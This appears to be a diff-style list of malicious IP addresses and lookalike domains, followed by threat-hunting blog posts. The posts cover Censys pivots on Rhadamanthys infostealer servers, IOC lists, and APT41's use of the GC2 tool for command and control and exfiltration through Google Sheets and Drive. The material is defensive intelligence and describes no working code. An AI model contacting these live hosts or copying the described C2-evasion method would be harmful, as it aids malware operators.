+116.62.194.46
+118.107.44.132
+118.107.44.133
+118.107.44.134
+118.193.35.61
+118.194.239.90
+119.160.235.91
+119.160.235.92
+119.28.1.231
+119.28.69.128
+121.43.186.132
+129.211.168.154
+13.115.129.191
+13.115.194.155
+13.229.238.49
+134.122.133.80
+134.122.133.86
+134.122.133.95
+134.122.167.94
+137.220.183.79
+139.180.217.14
+139.84.137.8
+139.84.227.139
+14.128.54.54
+141.193.159.122
+141.98.212.38
+141.98.212.50
+141.98.212.75
+142.202.205.38
+143.244.129.100
+143.92.52.130
+143.92.52.133
+143.92.52.137
+143.92.56.71
+143.92.60.54
+143.92.60.75
+143.92.60.77
+146.70.113.134
+149.28.131.99
+149.28.141.2
+149.28.25.119
+152.32.139.70
+152.32.211.67
+152.32.243.122
+154.19.85.71
+154.219.2.142
+154.82.85.79
+154.84.23.103
+154.84.23.110
+154.84.23.116
+154.84.24.184
+154.90.48.107
+155.138.246.52
+156.234.169.19
+156.244.31.112
+156.244.45.238
+156.251.17.206
+156.255.2.82
+156.59.183.241
+156.59.223.60
+158.247.201.246
+158.247.244.252
+158.247.252.115
+159.65.157.64
+16.162.255.7
+16.162.44.42
+16.163.145.17
+165.154.64.215
+165.84.180.74
+167.179.89.246
+167.179.98.155
+172.111.150.26
+172.111.150.58
+172.111.233.118
+172.111.233.119
+172.111.233.196
+172.111.233.56
+172.111.233.63
+172.111.233.93
+172.94.111.150
+172.94.111.75
+175.27.191.226
+176.119.203.246
+18.162.154.219
+18.163.46.232
+180.178.44.50
+180.178.44.51
+180.178.44.52
+180.178.44.53
+180.178.44.54
+182.16.3.186
+182.16.3.187
+182.16.3.188
+182.16.3.189
+182.16.3.190
+182.16.60.150
+182.16.90.50
+182.16.90.51
+182.16.90.52
+182.16.90.53
+182.16.90.54
+182.255.45.230
+185.101.139.99
+185.161.209.2
+185.189.241.155
+185.189.241.208
+185.189.241.209
+185.200.64.79
+185.235.242.10
+185.243.113.179
+185.243.114.179
+185.243.115.134
+192.189.2.23
+192.248.183.208
+194.246.114.4
+194.37.97.132
+194.56.225.13
+195.234.62.57
+198.13.34.16
+198.135.48.10
+2.58.14.134
+2.58.14.207
+2.58.15.166
+2.58.15.48
+20.191.154.204
+20.2.64.10
+20.214.1.160
+20.243.19.18
+202.144.192.146
+202.144.192.20
+202.144.192.75
+202.144.194.101
+202.144.194.63
+202.91.35.211
+202668.com
+203.69.170.86
+203.86.233.102
+204.194.66.139
+206.238.92.8
+207.148.126.75
+207.148.76.98
+207.148.97.160
+208.72.153.162
+208.85.16.182
+208.85.16.252
+209.250.241.189
+212.192.12.157
+212.192.15.136
+216.238.113.209
+218.189.80.44
+223.26.52.163
+23.225.71.115
+23.227.196.31
+23.227.203.181
+23.27.199.250
+27.102.106.148
+27.102.106.153
+27.102.129.217
+27.102.134.110
+27.124.34.182
+3.1.68.20
+3.112.45.157
+34.125.227.13
+34.81.228.78
+34.84.134.228
+34.92.30.54
+34.92.77.165
+34.96.231.241
+35.220.217.217
+35.77.99.82
+38.147.172.16
+38.181.2.2
+38.47.116.103
+38.47.123.94
+38.47.218.202
+38.47.221.86
+38.54.105.187
+38.54.105.96
+38.54.40.60
+38.54.50.224
+38.60.214.81
+38.60.216.7
+38.60.220.53
+38.60.255.42
+40.74.70.136
+43.132.150.19
+43.133.235.218
+43.135.1.200
+43.135.48.48
+43.136.245.27
+43.153.162.95
+43.206.211.42
+43.230.9.22
+43.230.9.230
+43.242.34.12
+43.246.208.107
+43.255.28.190
+45.117.102.174
+45.12.91.12
+45.133.239.200
+45.138.157.155
+45.139.225.108
+45.139.226.104
+45.150.64.5
+45.153.231.229
+45.204.197.61
+45.204.2.24
+45.204.2.26
+45.204.20.195
+45.204.20.196
+45.249.89.43
+45.32.148.180
+45.32.149.253
+45.32.45.105
+45.32.5.235
+45.58.47.141
+45.63.65.123
+45.74.6.134
+45.74.6.161
+45.74.6.165
+45.74.6.209
+45.74.6.68
+45.74.60.46
+45.76.147.80
+45.76.149.43
+45.76.157.243
+45.76.219.71
+45.77.157.245
+45.77.242.179
+45.77.37.28
+45.80.211.109
+45.80.215.133
+45.86.162.247
+45.86.163.207
+47.108.134.116
+47.238.202.81
+47.238.98.194
+47.242.114.104
+47.242.189.104
+47.243.198.15
+47.243.41.120
+47.243.61.114
+47.250.88.185
+47.75.177.15
+5.183.95.137
+5.183.95.202
+5.253.41.53
+5.255.88.185
+5.34.176.111
+5.34.176.152
+5.34.176.156
+5.8.33.81
+52.195.175.82
+52.197.158.117
+52.198.183.214
+52.35.227.119
+52.77.42.172
+54.167.79.208
+54.193.45.167
+54.219.223.239
+54.241.220.3
+54.249.142.61
+54.249.202.142
+54.250.239.189
+61.238.103.165
+61.238.103.204
+63.141.237.100
+63.141.237.208
+63.141.237.222
+64.176.58.12
+64.176.81.33
+64.44.184.105
+64.44.57.14
+64.7.198.130
+70.34.197.27
+72.18.215.38
+7hcbhfyew64kk.com
+8.130.107.166
+8.130.26.42
+8.130.34.199
+8.217.239.245
+8.218.191.58
+8.218.234.216
+80.240.28.192
+85.90.217.100
+91.196.68.40
+91.208.240.27
+91.210.107.131
+91.225.217.208
+91.225.217.23
+91.225.217.75
+91.245.253.62
+94.131.110.28
+942m.com
+95.179.244.134
+96.43.101.229
+96.9.210.77
+96.9.211.159
+amytsui.com
+apple-update-login-mail.explorate.de
+awz.karpasky.com
+bense51.com
+bense69.com
+bunkeranlagen.de
+cheerlotopsite2023.top
+cisco.893yakuza.com
+data.flyingwithme.com
+data.prtdat.org
+ddos271.rbnetidc.com
+designcocos.com
+dev.office-w.com
+dj001.club
+ebooking.fancyit.cn
+hastiing.com
+heyedu.cn
+hfjtadmin2.com
+hleqcatner.com
+jzfysy.com
+kailekang.com
+kkpay1.site
+kr.942m.com
+kwd.flyingwithme.com
+mail-information-ajour.bunkeranlagen.de
+mail.popanalysis.com
+map.flyingwithme.com
+mit77.com
+mlcorsoft.org
+mlcorsoft.xyz
+news.revecontopsy.com
+newsforname.site
+osama.pro
+payccooxx.top
+production-2.futuriamedia.no
+ribenzhongshipin19.longmaoyyds.top
+sc.xcb.one
+services.googlesoftservice.net
+shiteczgg.com
+sincere-home.com
+sksdwl.com
+support.firewallsupportservers.com
+tools.daji8.me
+tools.googleupdateinfo.com
+travel.flyingwithme.com
+turky.info
+update.chatgpt-server.com
+update.mlcorsoft.com
+updatenpm.com
+vip.network1000.co
+wpsup.daj8.me
+www.amytsui.com
+www.bense69.com
+www.dj001.club
+www.fancyit.cn
+www.mit77.com
+www.sincere-home.com
+yaojing77.com
+yjdmm.pro
+Gone Phishing
+Hunting Rhadamanthys Infrastructure in the 2024 Holiday Season
+Vasilis Orlof
+Dec 01, 2024
+
+As the holiday season approaches, threat actors are increasing the deployment of infostealer campaigns (among others), with a particular focus on exploiting trusted travel and shopping platforms.
+
+
+Twitter user JAMESWT_MHT reported a malicious PDF attached to a phishing email. The reported file contains the Rhadamanthys infostealer.
+
+
+
+Rhadamanthys
+
+Is an infostealer malware primarily delivered through phishing campaigns that leverage social engineering tactics. It has gained notoriety for its rapid iterations, with the most recent version (0.7.0) released in June 2024, incorporating sophisticated features like AI powered optical character recognition (OCR) for extracting cryptocurrency wallet seed phrases from images. The malware typically infiltrates systems via password protected ZIP files containing LNK files that execute malicious PowerShell scripts to download the stealer directly into memory.
+
+Analysis
+Using Censys and the IP associated with the sample I performed a few pivots that led to additional malicious infrastructure used by the Rhadamanthys malware.
+
+
+Examining the reported IP and the service running on port 7257 (HTTP) I was able to uncover 18 new servers matching the exact value.
+
+Services Banner
+First pivot was done by looking at services banner in Censys, what we're actually seeing is the initial response a server sends back when something tries to connect to it.
+
+
+services.banner="HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\nServer: Microsoft-IIS/8.0\r\nDate:  <REDACTED>\r\nContent-Length: 166\r\n"
+
+This result, gives us some information. For example, we know the server is using HTTP 1.1 and reveals that this is Microsoft's Internet Information Services web server, specifically version 8.0. This is particularly interesting because IIS 8.0 was released with Windows Server 2012, which gives us information about the likely operating system.
+
+From the resulting 18 servers most were already reported as malicious and some have been already associated with the Rhadamanthys infostealer, others have not been flagged yet, indicating either newly provisioned infrastructure or a coincidence simply matching the services banners.
+
+
+
+
+Services Certificate
+The next pivot was done by looking at the services certificate. When looking at the certifate we are basically looking at a SHA-256 hash of the server's TLS/SSL certificate. This hash acts like a unique fingerprint for that specific certificate.
+
+services.certificate="9eb7407fb6363c4d2a191afb9c5ed8cb16c41a68a87d60fa7dc6294f6b2c4892"
+
+The search returned 4 servers running MS server 2012, even though those IPs were not associated with Rhadamanthys malware, we can say with high confidence that it’s actually associated, based on the service certificate and the above finding related to the service banner.
+
+
+Jarm Fingerprint
+Finally, the last pivot was performed based on
+
+- JARM Fingerprint
+- OpenSSH 8.0
+- Port 22
+- OS server 2012
+
+The JARM fingerprint (3fd21b20d3fd3fd21c43d21b21b43d1ec49a4b64df0a9e9f328abd60285841) acts like a digital signature that identifies how a server handles TLS/SSL connections. This helps us identify servers configured in a particular way. The OpenSSH 8.0 software specification tells us exactly which version of SSH server software is running, the port 22 is a bit redundant but anyway :)
+
+Windows Server 2012 CPE identifier tells us the exact operating system running on these servers which is a crucial parameter of our hypothesis.
+
+services.jarm.fingerprint:"3fd21b20d3fd3fd21c43d21b21b43d1ec49a4b64df0a9e9f328abd60285841" AND services.software.uniform_resource_identifier:"cpe:2.3:a:openbsd:openssh:8.0:*:*:*:*:*:*:*" AND services.port:22 AND services.software.uniform_resource_identifier:"cpe:2.3:o:microsoft:windows_server_2012:*:*:*:*:*:*:*:*"
+This returned 8 hosts, 4 of them were not picked up in our previous pivots, outlining the importance of looking through multiple angles.
+
+
+
+And that’s all folks. This is just the tip of the iceberg, these campaigns are massive and the infrastructure is vast. As always, many more paths to be explored and rabbit holes to fall down to, so feel free to reach out if you are interested.
+Take care!
+
+IOC
+# Services Banner Pivot 
+
+88[.]210.12.126
+103[.]148.58.151
+104[.]37.175.232
+185[.]234.216.132
+154[.]216.19.192
+193[.]124.205.63
+103[.]148.58.152
+45[.]200.149.186
+179[.]61.251.153
+38[.]55.97.42
+45[.]155.220.96
+45[.]200.149.72
+154[.]216.19.192
+185[.]196.8.68
+185[.]196.8.56
+
+# Services Certificate Pivot
+
+185[.]196.10.135
+185[.]196.8.68
+185[.]196.8.76
+185[.]196.11.18
+
+# JARM Pivot
+
+185.209.162[.]23
+223.68.141[.]147
+8.134.34[.]5
+39.101.197[.]84
+
+APT41 - Google Sheets as C2
+Good luck detecting this traffic :)
+Vasilis Orlof
+Sep 05, 2024
+
+Old but gold!
+While doing research for an upcoming threat emulation exercise, I came across GC2 (Google Command and Control), a very useful tool for Red Teaming, Threat Emulations and Pentests, so I thought I should share it .
+
+GC2 (Google Command & Control)
+
+GC2 Git
+GC2, is a Command and Control application that allows an attacker to execute commands on the target machine using Google Sheet or Microsoft SharePoint List and exfiltrate files using Google Drive or Microsoft SharePoint Document.
+
+
+Naturally, I looked for known abuse cases that utilized this tool and one I found very interesting was the attack by APT41 on an unnamed Taiwanese media organization as reported by Google’s TAG (Threat Analysis Group).
+
+APT41 - Barium
+
+APT41 is a China-based threat actor that carries out state-sponsored espionage and financially motivated operations for personal gain.
+The threat actor started the attack sequence with a phishing email containing a password-protected file hosted on Google Drive. If the victim accessed the file, the victim’s system would download the malware payload, which was the GC2 tool.
+By installing GC2, the attackers could then query Google Sheets to obtain attacker commands and exfiltrate data via Google Drive.
+
+
+Additionally, GC2 enabled APT41 to download additional files from Google Drive onto the victim system.
+
+
+Google’s report outlines that this attack shows the increasing use of publicly available tooling like GC2 to obfuscate malicious traffic (all traffic relates to google domain), and the use of malware and tools written in Go, since it’s a cross-platform language, meaning that writing malware enables targeting Windows, Mac, and Linux from the same code.
